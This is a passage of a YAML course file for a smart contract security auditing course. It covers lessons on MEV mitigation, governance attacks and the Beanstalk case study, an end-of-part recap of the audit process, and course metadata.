          2. **Use of Private RPC or Dark Pools** ‚Äì These are networks that allow transactions to be processed outside of the public mempool. Services such as Flashbots Protect, Mev Blocker, and Secure RPC play an essential role in this regard.

          We should note that Mev is not some mythical concept ‚Äì it does have real-world consequences on the Ethereum blockchain. I have witnessed firsthand the material impact of it, even losing real money in the process.

          > quoted text"**Mev bots are real, and they are actively scouting for any opportunity to make money. Consequently, understanding how Mev works and how to protect against it is crucial for anyone operating within the blockchain landscape**."

          So, having read this blog post, you should now have a solid grasp of Mev. Here's to smarter and better-secured transactions on the blockchain!
        description: 'Patrick focuses on prevention and mitigation in this lesson on MEV vulnerabilities.'
      -
        id: ceb58aa9-58d3-4503-aff4-92ad38a9b4f6
        type: new_lesson
        enabled: true
        title: 'Governance Attack: Intro'
        slug: governance-attack-intro
        duration: 7
        video_url: SR9klB02AgWU02OnuYturXAzUwDhG1rz5YwUewUW6mRbI
        raw_markdown_url: /routes/security/8-mev-and-governance/14-governance-attack-intro/+page.md
        markdown_content: |-
          ---
          title: Governance Attack - Introduction
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          For this one, sit back and relax as Cyfrin's own [Juliette](https://twitter.com/_juliettech) gives us a walkthrough of governance attacks from a high level.
        description: 'Guest speaker Juliette Chavalier introduces us to the mechanisms of a governance attack.'
      -
        id: 1a7f7d59-f971-4aa0-8085-58514c7f818e
        type: new_lesson
        enabled: true
        title: 'Case Study: Bean'
        slug: case-study-bean
        duration: 20
        video_url: 5BnEkscLdV3LgCWXHZFHmaQMIxTHFFO1MxUOXox5OOo
        raw_markdown_url: /routes/security/8-mev-and-governance/15-case-study-bean/+page.md
        markdown_content: |-
          ---
          title: Case Study - Bean
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          And now, we have guest lecturer and fellow course creator [JohnnyTime](https://twitter.com/RealJohnnyTime) to walk us through a real-world case study of a governance attack in action.

          You can read more about the [Bean attack in Rekt.](https://rekt.news/beanstalk-rekt/)
        description: 'Patrick walks us through the Beanstalk case study wherein a flashloan was leveraged in a governance attack.'
      -
        id: 224db888-298d-4ee2-8c67-15fc3cb6eff3
        type: new_lesson
        enabled: true
        title: 'End Part 1'
        slug: end-part-1
        duration: 10
        video_url: 4jQ4wHrFAm2RLQCut16euCCa7JoidyrfDGeonxwGe8U
        raw_markdown_url: /routes/security/8-mev-and-governance/16-end-part-1/+page.md
        markdown_content: |-
          ---
          title: End of Part 1
          ---

          _Follow along with this video:_

          <!-- TODO -->


          ---

          # Congratulations on Nailing Part One of the Security Curriculum: Here's What's Next

          Hey, friends. Great to see you again. What a journey it's been so far!

          Getting through the first part of this majorly intense curriculum deserves a massive round of applause. We've covered a variety of crucial topics. From `Mev signature replays` and `reentrancy attacks`, we've gone over the `audit process`, to `stateful fuzzing`. We've also touched on interesting concepts like `invariants`, `arbitrage`, `DeFi`, `borrowing and lending`, `flash loans`, and much more.

          In just completing the last five security reviews, you've not only established a formidable portfolio but also demonstrated that persistent practice pays off. Remember: repetition is the mother of skill.


          ## You got this

          And here is the thing, we've just trained you on the EXACT process the professionals do. So you know how to do this!!

          ## The Game Plan

          **1. Scoping**

          Begin with scope identification. Determine what you're working with - the commit hash, the compatibilities, the chains, and the tokens.

          **2. High-Level Analysis**

          Next, aim to understand what the code is supposed to achieve. Read the documentation, discuss with the team, make diagrams, take notes. Dump all your thoughts down on paper.

          **3. Code Comprehension**

          Time to dive into the code. It‚Äôs okay if you don‚Äôt find anything at first ‚Äì that's normal. Simply aim to interpret the code. Ask yourself: Is the code doing what the protocol intends it to do?

          **4. Identifying Vulnerabilities**

          Your final mission is the most challenging - finding vulnerabilities. Use your checklist for guidance, looking for any weird ERC20s or potential MEV.

          ## Testing Your Skills

          The Vault Guardians code base offers greater complexity than any previous codebases. Embrace this new level of difficulty. Seize this opportunity to test your prowess in the face of adversity.

          My suggestion to you: team up with a peer. This vault presents numerous bugs and issues for you to uncover, which will help build your confidence and improve your bug-finding skills.

          **And remember: do not proceed to part two just yet.**

          ## A Valuable Detour

          Now, it's time. You have 2 options. 

          \**Option 1: Compete in a real competitive audit on platforms like Code Hawks. The excitement of the competition will keep you on edge and the real code base is sure to test all your abilities*.

          \*\*Option 2: Pair up and tackle the Vault Guardians codebase as a learning experience.

          ## To Recap:

          1. First of all, great job! By just getting this far, you outdo more than 70% of the current security landscape.
          2. Do not move to part two yet. Either try your hand at a Code Hawks competitive audit or complete the Vault Guardians audit with a partner.

          Remember your security journey is far from over. Part two is where we (will) dig even deeper into assembly, EVM, formal verification, and more. 

          So... We are looking forward to seeing you back for Part 2 after you try your hand at either Vault Guardians or Code Hawks.

          Good luck!!
        description: 'A final recap and congratulations for completion of Part 1 of the Security Course! Well done!'
    type: new_section
    enabled: true
updated_by: 44a6b6ba-b406-4967-8e25-d04180f0d9ef
learning_path: b4e80182-04bc-4448-b40d-e4d6e2f3a1a8
number_of_projects: 6
difficulty_level: advanced
learnings:
  -
    id: ltipx2mr
    learning: 'Smart contract invariants testing'
    type: learning_set
    enabled: true
  -
    id: ltiq07rq
    learning: 'Smart contract fuzz testing'
    type: learning_set
    enabled: true
  -
    id: ltiq09zd
    learning: 'Stateless and stateful fuzzing tools'
    type: learning_set
    enabled: true
  -
    id: ltiq0k44
    learning: 'Upgradeable smart contracts'
    type: learning_set
    enabled: true
  -
    id: ltiq0opy
    learning: 'Smart contracts auditing'
    type: learning_set
    enabled: true
  -
    id: ltiq0tc2
    learning: 'Cyfrin Aderyn'
    type: learning_set
    enabled: true
  -
    id: ltiq10ko
    learning: 'Manual review'
    type: learning_set
    enabled: true
target_audience:
  -
    id: ltiqiopf
    target: 'Web3 and blockchain engineers'
    type: target_audience_set
    enabled: true
  -
    id: luhqkwef
    target: 'Smart contract auditors'
    type: target_audience_set
    enabled: true
  -
    id: ltiqj0sq
    target: 'Software security professionals'
    type: target_audience_set
    enabled: true
  -
    id: lujtg1pc
    target: 'DevOps engineers'
    type: target_audience_set
    enabled: true
  -
    id: ltiqivb5
    target: 'CTOs and CSOs'
    type: target_audience_set
    enabled: true
select:
  - blockchain_basics
  - solidity_fundamentals
  - foundry_fundamentals
  - advanced_foundry
course_author:
  -
    id: ltirj3z3
    author: 8c756cc1-2d8a-41aa-9578-0ad4af9fbef3
    author_type: main
    type: course_author_set
    enabled: true
  -
    id: ltirjazs
    author: c9c6811b-286b-4cb2-849f-696b2e913336
    author_type: main
    type: course_author_set
    enabled: true
  -
    id: ltirkvra
    author: aa2226de-0946-4076-b9ea-8696988ce795
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirl63y
    author: a65e7692-af03-4227-b3e2-a498ba75d6a4
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirlj1b
    author: e7e3a14e-f191-4809-8887-53337c25ee38
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirlo8a
    author: c6572203-4f7c-46d5-aa94-a4ba2716b0b1
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirlxza
    author: a513d124-8b3f-495e-b3b6-a9ce0ae6b3ce
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirm3a5
    author: d4dcddd0-1a08-4e36-8609-473d07c70be2
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirmaqh
    author: ddbdec76-ed9c-4465-93a8-042acdb7e206
    author_type: guest
    type: course_author_set
    enabled: true
course_authors:
  -
    id: ltirzcmd
    author: 8c756cc1-2d8a-41aa-9578-0ad4af9fbef3
    author_type: main
    type: course_author_set
    enabled: true
  -
    id: ltirzisb
    author: c9c6811b-286b-4cb2-849f-696b2e913336
    author_type: main
    type: course_author_set
    enabled: true
  -
    id: ltirzrw5
    author: aa2226de-0946-4076-b9ea-8696988ce795
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltirzyg6
    author: a65e7692-af03-4227-b3e2-a498ba75d6a4
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltis04tu
    author: e7e3a14e-f191-4809-8887-53337c25ee38
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltis0avf
    author: c6572203-4f7c-46d5-aa94-a4ba2716b0b1
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltis0imm
    author: a513d124-8b3f-495e-b3b6-a9ce0ae6b3ce
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltis0oxw
    author: d4dcddd0-1a08-4e36-8609-473d07c70be2
    author_type: guest
    type: course_author_set
    enabled: true
  -
    id: ltis0t98
    author: ddbdec76-ed9c-4465-93a8-042acdb7e206
    author_type: guest
    type: course_author_set
    enabled: true
preview_image: security-and-auditing.png
prerequisites:
  - blockchain_basics
  - solidity_fundamentals
  - foundry_fundamentals
  - advanced_foundry
short_summary: 'Start your career as a smart contract security researcher! Learn smart contract auditing and the best practices for writing secure and optimized protocols. Explore fuzzing, invariant testing, and formal verification to identify bugs and protect web3 protocols.'
course_description: |-
  Become a **smart contract security auditor** and learn one of the most in-demand skills in web3!

  If you‚Äôre a Solidity smart contract developer, a seasoned developer, or a security researcher, this course will teach you everything you need to know to get started auditing and writing secure protocols.

  With over 100 lectures and more than **24 hours of videos and real-world auditing experience**, this comprehensive course will give you the skills to kickstart your Solidity smart contract security auditing career.

  We cover a wide variety of topics, including:
  - Smart contract invariants testing
  - Smart contract fuzz testing
  - Stateless and stateful fuzzing tools
  - Upgradeable smart contracts
  - Smart contracts auditing
  - Cyfrin Aderyn
  - Manual review
  - Smart contracts testing

  Project-based, the Smart contract auditing and security course include quizzes, tests, exercises, and assignments and 5 hands-on step-by-step audits performed on real-world mock smart contracts.

  We'll take you¬†**step-by-step**¬†through engaging video tutorials and written lessons to teach you everything you need to know to succeed as a Blockchain security researcher. Here's why:

  - The world‚Äôs leading smart contract security auditors teach the course with guests from top web3 auditing firms.
  - Continuously updated to teach you the latest tools and technologies used at large companies and protocols.
  - We've taught over 10,000 students how to audit and write secure solidity smart contracts.
  - The curriculum was developed over a period of 1 year, with comprehensive student testing, feedback, and reviews.
  - You'll save **over $5,000** by enrolling and getting access to the industry smart contract security learning material.
  - The course is¬†**constantly updated**¬†with new content, projects, and modules!


  This course will teach you solidity smart contract security auditing **practically**. Every lecture has a full coding screencast, step-by-step audit processes, and written lessons to learn how it fits you best!

  By the end of this course, you will be¬†ready to become a Solidity smart contract auditor and get lifetime access to over 100 lectures, corresponding resources, and repositories.

  So what are you waiting for? Learn a Solidity smart contract auditing completely for free!
meta: 'Learn smart contract security auditing and kickstart your career as a blockchain security researcher, completely for free.'
completed_image: course_completed/security.png
completed_copy: |-
  I'm excited to announce I've just completed the Updraft Smart Contract Security course üéâ

  A 24hrs course to learn about:
  - Advanced smart contract security security
  - Manual review
  - Invariant and Fuzz testing

  With 6 hands-on auditing sessions! Check it out üëá
potential_careers:
  - 8c5cc356-6f64-44d0-b8d7-75d26e113dd0
  - 9bc9e14c-d6ac-41f5-9481-932dc4d39364
  - a39bdd55-e477-4e2f-a490-0175c10b99f6
trending_tag: true
---
